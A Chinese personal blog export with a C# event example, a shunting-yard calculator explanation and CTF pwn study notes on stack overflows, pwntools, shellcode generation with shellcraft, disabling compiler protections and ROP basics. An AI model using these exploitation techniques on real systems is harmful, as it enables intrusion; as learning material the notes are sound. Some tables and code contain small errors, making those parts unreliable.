<p>​    arg2 参数为EventArgs的子类 表示传播信息</p>
</li>
</ol>
</li>
</ol>
<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">MyDelegate</span>(<span class="params"><span class="built_in">string</span> str</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">event</span> MyDelegate MyEvent;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnEventHappend</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    MyEvent?.Invoke(<span class="string">&quot;happened&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Display</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">&#123;	</span><br><span class="line">    <span class="comment">//1. 定义一个事件，然后把这个事件注册到某个响应上</span></span><br><span class="line">    MyEvent += Display  <span class="comment">//会输出happened</span></span><br><span class="line">    Peoople p = <span class="keyword">new</span> People();</span><br><span class="line">    MyEvent += p.PeopleResponed;</span><br><span class="line">    OnEventHappend();<span class="comment">//事件的触发</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Animal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AnimalRespond</span>(<span class="params"><span class="built_in">string</span> s</span>)	<span class="comment">//效应</span></span></span><br><span class="line">    &#123;</span><br><span class="line">    	Console.WriteLine(<span class="string">&quot;Animal Responed&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">People</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PeopleRespond</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">    	Console.WriteLine(<span class="string">&quot;People Responed&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>c#</tag>
      </tags>
  </entry>
  <entry>
    <title>计算器原理</title>
    <url>/2024/11/05/c-%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E5%99%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="计算器原理"><a href="#计算器原理" class="headerlink" title="计算器原理"></a>计算器原理</h1><p>计算器计算的表达式是后缀表达式。</p>
<p>我们输入一个表达式，计算器给出结果主要经过了：将中缀表达式转化为后缀表达式，计算后缀表达式这两个过程</p>
<p>而转化和计算过程运用到了数据结构“栈”。</p>
<p>我们为了简化过程，在转化后缀表达式过程中进行中间结果的计算。</p>
<h3 id="中缀表达式"><a href="#中缀表达式" class="headerlink" title="中缀表达式"></a>中缀表达式</h3><blockquote>
<p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E7%BC%80%E8%A1%A8%E7%A4%BA%E6%B3%95">中缀表示法 - 维基百科，自由的百科全书</a></p>
</blockquote>
<p>中缀表达法是自然语言的写法，其操作符在操作数的中间</p>
<p>如3+4</p>
<h3 id="后缀表达式（逆波兰表示法）"><a href="#后缀表达式（逆波兰表示法）" class="headerlink" title="后缀表达式（逆波兰表示法）"></a>后缀表达式（逆波兰表示法）</h3><blockquote>
<p><a href="https://zh.wikipedia.org/wiki/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E7%A4%BA%E6%B3%95">逆波兰表示法 - 维基百科，自由的百科全书</a></p>
</blockquote>
<p>即所有操作符在操作数的后面。</p>
<h5 id="求值过程"><a href="#求值过程" class="headerlink" title="求值过程"></a>求值过程</h5><ol>
<li>从左到右扫描表达式</li>
<li>遇到数字时，将数字压入堆栈</li>
<li>遇到运算符时<ul>
<li>弹出栈顶的两个数（栈顶和次顶），用运算符对它们做对应的计算，并将结果入栈</li>
<li>计算顺序是： 后弹出来的  （运算符）  先弹出来的</li>
</ul>
</li>
</ol>
<h3 id="调度场算法"><a href="#调度场算法" class="headerlink" title="调度场算法"></a>调度场算法</h3><blockquote>
<p><a href="https://zh.wikipedia.org/wiki/%E8%B0%83%E5%BA%A6%E5%9C%BA%E7%AE%97%E6%B3%95">调度场算法 - 维基百科，自由的百科全书</a></p>
</blockquote>
<p>将中缀表达式转化为后缀表达式的算法。</p>
<p>为了方便快速计算，我们使用两个栈：运算符栈s1和操作数栈s2。操作数栈其实也可以看作中间结果栈。</p>
<p>在操作数压栈过程中，直接入栈即可。</p>
<p>在运算符压栈过程中，需要保持栈顶运算符为当前优先级最高的。换言之就是比当前栈内运算符优先级高的运算符已经完成了运算操作。</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2368409-20211208192029096-52314956.png" alt="img" style="zoom:67%;">

<h5 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h5><ol>
<li><p>初始化两个栈：</p>
<ul>
<li>运算符栈：s1</li>
<li>中间结果栈：s2</li>
</ul>
</li>
<li><p>从左到右扫描中缀表达式</p>
</li>
<li><p>遇到操作数时，将其压入s2</p>
</li>
<li><p>遇到运算符时</p>
<ul>
<li>比较它和s1栈顶运算符的优先级：<ul>
<li>如果s1为空或者栈顶运算符符号为（，则将其压入符号栈s1</li>
<li>如果优先级比栈顶运算符高，也将其压入符号栈s1</li>
<li>如果优先级比栈顶运算符低或相等，将s1栈顶的运算符弹出，并压入到s2中。</li>
</ul>
</li>
<li>再重复比较它和新栈顶运算符的优先级。</li>
</ul>
<blockquote>
<p>[!NOTE]</p>
<p>重复的含义：</p>
<ol>
<li><p>如果s1栈顶元素符号优先级比当前符号高或者等于，那么就将其弹出压入s2中（循环做，只要s1不为空）。</p>
<p>如果栈顶符号为 （ ，其优先级最低，就不会弹出，就跳出循环了。</p>
</li>
<li><p>跳出循环后，则将当前符号压入s1</p>
</li>
</ol>
</blockquote>
</li>
<li><p>遇到括号时：</p>
<ul>
<li>如果是左括号（ ：则直接压入s1</li>
<li>如果是右括号  ）：则以此弹出s1栈顶的运算符，并压入s2，知道遇到左括号为止，此时将这一对括号丢弃。</li>
</ul>
</li>
<li><p>重复步骤2~5，直到表达式最右端。</p>
</li>
<li><p>将s1中的运算符以此弹出并压入 s2。</p>
</li>
<li><p>以此弹出 s2 中的元素并输出，结果的 逆序 即为：中缀表达式转为后缀表达式。</p>
</li>
</ol>
<h5 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1+((2+3)*4)-5	</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th align="center">扫描到的元素</th>
<th align="center">s2(栈底-&gt;栈顶)</th>
<th align="center">s1(栈底-&gt;栈顶)</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">4</td>
<td align="center">空</td>
<td align="center">遇到操作数，压入s2</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">1</td>
<td align="center">+</td>
<td align="center">s1栈为空，压入s1</td>
</tr>
<tr>
<td align="center">（</td>
<td align="center">1</td>
<td align="center">+（</td>
<td align="center">左括号，压入s1</td>
</tr>
<tr>
<td align="center">（</td>
<td align="center">1</td>
<td align="center">+（（</td>
<td align="center">左括号，压入s1</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">1 2</td>
<td align="center">+（（</td>
<td align="center">遇到操作数，压入s2</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">1 2</td>
<td align="center">+（（+</td>
<td align="center">栈顶为（，压入s2</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">1 2 3</td>
<td align="center">+（（+</td>
<td align="center">遇到操作数，压入s2</td>
</tr>
<tr>
<td align="center">）</td>
<td align="center">1 2 3 +</td>
<td align="center">+（</td>
<td align="center">遇到右括号，弹出+后遇到左括号，删除一对小括号</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">1 2 3 +</td>
<td align="center">+（*</td>
<td align="center">遇到操作符，压入s1</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">1 2 3 + 4</td>
<td align="center">+（*</td>
<td align="center">遇到操作数，压入s2</td>
</tr>
<tr>
<td align="center">）</td>
<td align="center">1 2 3 + 4 *</td>
<td align="center">+</td>
<td align="center">遇到右括号，弹出*后遇到左括号，删除一对小括号</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">1 2 3 + 4 * +</td>
<td align="center">-</td>
<td align="center">遇到操作符，优先级相等，弹出+后s1为空，此时将-压入 s1</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">1 2 3 + 4 * + 5</td>
<td align="center">-</td>
<td align="center">遇到操作数，压入s2</td>
</tr>
<tr>
<td align="center">null</td>
<td align="center">1 2 3 + 4 * + 5 -</td>
<td align="center">空</td>
<td align="center">解析完毕，弹出s1中符号并压入s2中</td>
</tr>
</tbody></table>
<p>结果：1 2 3 + 4 * + 5</p>
<p>这是理论上转化后缀码的步骤。</p>
<p>优化后的程序为</p>
<table>
<thead>
<tr>
<th align="center">扫描到的元素</th>
<th align="center">s2(栈底-&gt;栈顶)</th>
<th align="center">s1（栈底-&gt;栈顶）</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">4</td>
<td align="center">空</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">1</td>
<td align="center">+</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">（</td>
<td align="center">1</td>
<td align="center">+（（</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">1 2</td>
<td align="center">+（（</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">1 2</td>
<td align="center">+（（+</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">1 2 3</td>
<td align="center">+（（+</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">）</td>
<td align="center">1 5</td>
<td align="center">+（</td>
<td align="center">将+压入s1，消除小括号，s2计算3 + 2</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">1 5</td>
<td align="center">+（*</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">1 5 4</td>
<td align="center">+（*</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">）</td>
<td align="center">1 20</td>
<td align="center">+</td>
<td align="center">将*压入s1，消除小括号，是、s2计算 4 * 5</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">21</td>
<td align="center">-</td>
<td align="center">将+压入s2，计算20+1</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">21 5</td>
<td align="center">-</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">null</td>
<td align="center">16</td>
<td align="center"></td>
<td align="center">将s1弹栈，压入s2</td>
</tr>
</tbody></table>
<p>结果为16</p>
<p>这个讲数据结构的笔记挺好的： <a href="https://zq99299.github.io/dsalg-tutorial/">数据结构与算法 系列教程（笔记）</a></p>
]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn学习</title>
    <url>/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><blockquote>
<p>来源：</p>
<p>[0002.哔哩哔哩-【个人向】CTF pwn 入门-P2<a href="https://www.bilibili.com/video/BV1854y1y7Ro?vd_source=73decf7c030f3abfceb81f802abd8fd0&p=2&spm_id_from=333.788.videopod.episodes">高清版]_哔哩哔哩_bilibili</a></p>
</blockquote>
<h1 id="PPT链接"><a href="#PPT链接" class="headerlink" title="PPT链接"></a>PPT链接</h1><p><a href="https://onedrive.live.com/edit.aspx?resid=4465402B41B4B710!seb0e4dd0494f4f52bef5c10a8eed95ec">PWN.pptx - Microsoft PowerPoint Online</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116150330270.png" alt="image 20241116150330270"></p>
<h1 id="第一节：可执行文件、ELF文件结构"><a href="#第一节：可执行文件、ELF文件结构" class="headerlink" title="第一节：可执行文件、ELF文件结构"></a>第一节：可执行文件、ELF文件结构</h1><p>探讨从test.c到a.out的过程。研究一下a.out的结构</p>
<h1 id="第二节：程序装载和运行内存"><a href="#第二节：程序装载和运行内存" class="headerlink" title="第二节：程序装载和运行内存"></a>第二节：程序装载和运行内存</h1><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116150619921.png" alt="image-20241116150619921"></p>
<p>节视图是放在磁盘中划分功能的，段视图是程序装载到内存中来划分不同读写权限的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116151250348.png" alt="image-20241116151250348"></p>
<p><strong>看图说话：</strong></p>
<blockquote>
<p>[IMPORTANT]</p>
<p><strong>权限相同的节归在一起成了段。</strong></p>
</blockquote>
<p>这个<strong>合并</strong>的过程是由 <code>Linker</code> 来完成的</p>
<p>从ELF文件到虚拟内存空间这个<strong>映射过程</strong>是由操作系统（<code>OS</code>）来完成的    （所以上图仅供Linux参考）</p>
<p>图中发现，.rodata这个数据节被划分到了Code段中。这是为什么？					——只依据权限划分</p>
<p>可执行程序内容只占了<strong>一部分内存区域</strong>。左边的ELF文件，实际上只有右边的Data和Code两个小长方形。其他是什么后面再说</p>
<p>地址以字节编码，常以十六进制表示。</p>
<p>虚拟内存<strong>用户空间</strong>每个进程一份</p>
<p>虚拟内存<strong>内核空间</strong>所有进程共享一份</p>
<p>虚拟内存mmap段中的<strong>动态链接库</strong>仅在物理内存中装载一份</p>
<h5 id="虚拟地址空间（虚拟内存）和物理内存"><a href="#虚拟地址空间（虚拟内存）和物理内存" class="headerlink" title="虚拟地址空间（虚拟内存）和物理内存"></a>虚拟地址空间（虚拟内存）和物理内存</h5><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116153505516.png" alt="image-20241116153505516" style="zoom: 50%;">

<p>x86-LInux（32位的进程虚拟地址空间）    一共4GB（整个4GB对应内存中的ELF）</p>
<p>用户空间分3GB，1GB共享内核空间。（节省资源的目的） </p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116154309783.png" alt="image-20241116154309783" style="zoom:50%;">



<p>如果是64位进程虚拟地址空间，地址的有效位其实是6个字节。因为这足够大了</p>
<h5 id="段与节"><a href="#段与节" class="headerlink" title="段与节"></a>段与节</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116231329387.png" alt="image-20241116231329387"></p>
<p>text节就是我们的主程序</p>
<p>一个段是节的<strong>高层次</strong>。</p>
<p>段视图用于进程的内存区域的rwx<strong>权限划分</strong></p>
<p>节视图用于ELF文件编译链接时与磁盘上存储的文件结构的组织</p>
<h5 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116232159290.png" alt="image-20241116232159290"></p>
<p><code>glb</code>作为没有赋初值的全局变量，不占磁盘空间但占由内存空间。储存在Bss中</p>
<p><code>“Hello World”</code>虽然是一个字符串 常量，但是在<code>Text</code>段中（一般认为这是代码成分）。这是因为它只有可读性，属于Text段中的<code>.rodata</code>节</p>
<p>函数被编译后还是数据，数据是被用来执行的代码。既然是代码段，所以在Text段。</p>
<p>函数调用在栈中</p>
<p>局部变量ptr在栈中</p>
<p>malloc申请的空间在堆中</p>
<p>x,y在哪儿与系统架构有关。AMD64在寄存器，x86在栈</p>
<h1 id="第三节：CPU与进程的执行"><a href="#第三节：CPU与进程的执行" class="headerlink" title="第三节：CPU与进程的执行"></a>第三节：CPU与进程的执行</h1><p> <img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116233739080.png" alt="image-20241116233739080"></p>
<p>CPU通过总线向内存发送访存指令。</p>
<h1 id="第四节：装载与汇编"><a href="#第四节：装载与汇编" class="headerlink" title="第四节：装载与汇编"></a>第四节：装载与汇编</h1><p>汇编这个，课堂任务，懒得写</p>
<p>装载这个，没学会，写不出来</p>
<h1 id="第五节：栈溢出基础"><a href="#第五节：栈溢出基础" class="headerlink" title="第五节：栈溢出基础"></a>第五节：栈溢出基础</h1><h3 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><p>研究的是x86嗷</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117141336080.png" alt="image-20241117141336080" style="zoom: 67%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117141635096.png" alt="image-20241117141635096" style="zoom: 67%;"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117143029165.png" alt="image-20241117143029165" style="zoom:50%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117143135103.png" alt="image-20241117143135103" style="zoom:50%;"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117143257088.png" alt="image-20241117143257088" style="zoom:50%;"><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117143429165.png" alt="image-20241117143429165" style="zoom:50%;"></p>
<p>函数状态主要涉及三个寄存器——<code>esp</code>、<code>ebp</code>、<code>eip</code>。</p>
<p><code>esp</code><strong>用来存储函数调用栈的栈顶地址</strong>，在压栈和退栈的时候发生变化。</p>
<p><code>ebp</code><strong>用来存储当前函数状态的基地址</strong>，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</p>
<p><code>eip</code><strong>用来存储即将执行的程序指令的地址</strong>，cpu依照eip的存储内容读取指令并执行，eip随之指向相邻的下一条指令。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241117140052263.png" alt="image-20241117140052263"></p>
<p><code>return address</code>：返回地址</p>
<p><code>stack frame pointer</code>：<strong>上一个栈帧的栈顶</strong>（ebp）的值。方便恢复父函数的栈顶指针</p>
<p><code>local variables</code>：<strong>局部变量</strong></p>
<p><code>arguments</code>：子函数所用到的<strong>形参</strong>。 子函数保存的参数实际上在父函数栈帧的末尾。</p>
<p>能看出来吗，图中的例子是个循环结构</p>
<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241118100801676.png" alt="image-20241118100801676"></p>
<p>试试看能不能在没有讲解的情况下捋完整个过程。</p>
<p>不行看PPT去</p>
<p><strong>main函数的栈帧是第一个栈帧，在此之前运行的函数是没有栈帧的</strong></p>
<h3 id="栈溢出攻击"><a href="#栈溢出攻击" class="headerlink" title="栈溢出攻击"></a>栈溢出攻击</h3><p>要得到shell，就要控制程序的执行流</p>
<p>要控制程序的执行流，就要控制PC寄存器</p>
<p>要控制PC寄存器，就要控制能为PC寄存器赋值的数据</p>
<p>也就是要<strong>控制子函数返回父函数的 return address</strong></p>
<p>栈溢出是<strong>缓冲区溢出</strong>的一种。</p>
<p>缓冲区溢出的本质是向<strong>定长的缓冲区</strong>写入了<strong>超长的数据</strong>，造成超出的数据腹泻了合法内存区域</p>
<p>缓冲区溢出分为<strong>栈溢出</strong>、<strong>堆溢出</strong>和<strong>BSS溢出</strong>三种</p>
<h5 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241118103900450.png" alt="image-20241118103900450"></p>
<h1 id="第六节：熟练使用工具"><a href="#第六节：熟练使用工具" class="headerlink" title="第六节：熟练使用工具"></a>第六节：熟练使用工具</h1><p>一切的开端</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>



<p>执行文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./文件名&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;IP&quot;</span>,Port)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241120202629020.png" alt="image-20241120202629020"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recv()		//读取全部输出</span><br><span class="line"></span><br><span class="line">io.recvline()	//读取一行输出</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241120202840185.png" alt="image-20241120202840185"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendline(p64<span class="string">&quot;15&quot;</span>)	//自带换行。若是<span class="number">32</span>位整数则是p32</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&quot;135asdf\n&quot;</span>)	//send只能发送二进制数据。</span><br></pre></td></tr></table></figure>





<h5 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h5><p>g  跳转到指定地址</p>
<h5 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h5><p>run 运行</p>
<p>r</p>
<p>b （break point）     b main即运行完主函数</p>
<p>n  进行下一步</p>
<p>vmmap</p>
<p>注意gdb是用一种特殊的方式来进行的进程映像，所以gdb的栈地址（很大概率）不一定是可靠的地址。</p>
<p>但是gdb中看到的偏移一定是可靠的</p>
<p>相比IDA 中看到的偏移不一定可靠</p>
<h5 id="机器码"><a href="#机器码" class="headerlink" title="机器码"></a>机器码</h5><p><code>shellcraft</code></p>
<p><code>shellcraft.sh()</code> 	输出汇编代码</p>
<p><code>print（shellcraft.sh() ）</code>  这是我们要的shellcode</p>
<p><code>print(asm(shellcraft.sh()))</code> 	转化为机器码</p>
<p>以上是32位</p>
<p>如是64位</p>
<p><code>shellcraft.amd64.sh()</code></p>
<p>不过最好先加上 <code>context.arch = &quot;amd64&quot;</code></p>
<p>刷题去吧，写题解</p>
<h1 id="第七节：程序保护措施"><a href="#第七节：程序保护措施" class="headerlink" title="第七节：程序保护措施"></a>第七节：程序保护措施</h1><p>使用checksec查看</p>
<h4 id="ASLR（Address-Space-Layout-Randomization）"><a href="#ASLR（Address-Space-Layout-Randomization）" class="headerlink" title="ASLR（Address Space Layout Randomization）"></a>ASLR（Address Space Layout Randomization）</h4><p><strong>地址空间随机化</strong>。</p>
<p>系统的防护措施，程序装载时生效。操作系统默认打开</p>
<p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x3D; <strong>0</strong>：<strong>没有随机化</strong>。即关闭 ASLR</p>
<p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x3D; <strong>1</strong>：<strong>保留的随机化</strong>。共享库、栈、mmap() 以及 VDSO 将被随机化</p>
<p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x3D; <strong>2</strong>：<strong>完全的随机化</strong>。在randomize_va_space &#x3D; 1的基础上，通过 brk() 分配的内存空间也将被随机化</p>
<h5 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h5><p>总的来说，这种保护措施使得栈地址和内核空间有一段不可知的偏移，导致在栈上写的shellcode无法知道准确地址。</p>
<p>如果缓冲区足够长，可以在shellcode下写入大量的nop指令（构造nop滑梯），一路向上执行直到运行shellcode</p>
<h4 id="The-NX-bits-the-No-eXecute-bits"><a href="#The-NX-bits-the-No-eXecute-bits" class="headerlink" title="The NX bits (the No-eXecute bits)"></a>The NX bits (the No-eXecute bits)</h4><p>栈缓冲区不可执行</p>
<p>只要不应该是代码的地方都不执行</p>
<p>所以<strong>一般思路将shellcode写入bss</strong>。 写入堆很少。<del>但听说ctf很多</del></p>
<p><strong>bss是用来存放全局变量的</strong></p>
<h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><p>在previous ebp前放了一个canary数组，内容为随机数</p>
<p>在栈帧销毁时（leave指令前），会检测Canary数组的值是否改变，如果改变程序会寄掉</p>
<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>编译器编译时打开的开关，与ASLR区分</p>
<p>随机化Data，Text和Bss</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241122111607229.png" alt="image-20241122111607229" style="zoom:50%;">



<p>在脚本头上写下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gcc -fno-stack-protector -z execstack -no-pie -g -o ret2stack ret2stack.c</span><br></pre></td></tr></table></figure>

<p>生成程序后，checksec一下</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126213339533.png" alt="image-20241126213339533" style="zoom: 33%;">



<h1 id="第八节：返回导向编程"><a href="#第八节：返回导向编程" class="headerlink" title="第八节：返回导向编程"></a>第八节：返回导向编程</h1><p>多次篡改IP成我们想要的地址的过程</p>
<p>和前面的栈溢出不同的是，以前的基础栈溢出可以一步到位（因为有后门函数或者可以注入shellcode）。而现在无了。</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
<li>是操作系统提供给用户的编程接口，这些接口可以被链接库封装成一个函数。</li>
<li>是<strong>提供访问操作系统所管理的底层硬件的接口</strong></li>
<li>本质上是一些内核（Kernel）函数代码，以规范的方法驱动硬件</li>
<li>x86通过int 0x80指令进行系统调用、amd64通过syscall指令进行系统调用</li>
</ul>
<p>举例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">my_puts</span><span class="params">()</span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, shellcode, <span class="number">0x100</span>); <span class="comment">//这个write其实是动态链接库帮忙封装好的函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样一个代码，在<strong>操作系统层面</strong>是如何实现的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, xx</span><br><span class="line"></span><br><span class="line">mov ebx, xx	;赋值要输出的东东</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>



<h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>什么是动态链接库？</p>
<p>使用<code>ldd</code>指令可以看到使用到的所有链接库</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126221633861.png" alt="image-20241126221633861"></p>
<p>最下面的那东西，把我们所需要的所有动态链接库，文件，全部<strong>装载到shared library</strong>中。</p>
<p>我们要关注的是<code>libc.so</code>。这是一个<strong>软链接</strong>，不是一个具体的实现。</p>
<p><strong>什么是软链接？</strong></p>
<p>这好比我们的快捷方式。不管这个应用程序发生了什么样的改变，只要位置没变，这个快捷方式就可以打开这个应用程序。相比之，动态链接库也是在不断更新的，libc.so就充当了这个代名人。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126222805442.png" alt="image-20241126222805442">	</p>
<p>这里没绑定动态链接库啊。</p>
<p>如果绑定了就可以直接执行，相当于直接执行这个动态链接库</p>
<p>简而言之，<strong>动态链接库就是存放在lib目录的一些可执行文件</strong>而已，这些库里面已经包含了大量的已经写好的C语言代码。</p>
<p>而<strong>软链接就是动态链接库的一个快捷方式</strong></p>
<p>同样看上面那个write的例子，在执行程序的时候，执行流为：</p>
<p><code>my_puts()</code>	&#x3D;&#x3D;&gt;	<code>write()</code>	&#x3D;&#x3D;&gt;	<code>sys_write()</code></p>
<p>从<strong>Text</strong>到<strong>shared library</strong>再到<strong>Kernel</strong></p>
<p>各个函数都有对应的系统调用号，如write的系统调用号是4 。write函数是对sys_write这样一个系统调用的一个封装</p>
<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><h5 id="一个重要的系统调用"><a href="#一个重要的系统调用" class="headerlink" title="一个重要的系统调用"></a>一个重要的系统调用</h5><p><code>execve</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126224956779.png" alt="image-20241126224956779"> </p>
<p>分析系统调用的过程：</p>
<p>首先赋值一个<strong>系统调用号</strong>（<strong>eax</strong>）    （execev的系统调用号是11）</p>
<p><strong>ebx，ecx，edx保存系统调用的参数</strong></p>
<p>int（interrupt）中断，<strong>0x80代表的就是系统调用</strong></p>
<p>所以我们首先知道这是一个系统调用，然后查看系统调用号看看这是哪个系统调用，最后传递参数执行</p>
<p>只需要这几条汇编代码就可以得到shell，但现实往往不会白白将这些代码连续得写到程序中。</p>
<p>不过，有这些程序片段也是可以的。</p>
<p>这就是<strong>ROP</strong></p>
<p><strong>让分离的代码连续执行，达到对应的效果</strong></p>
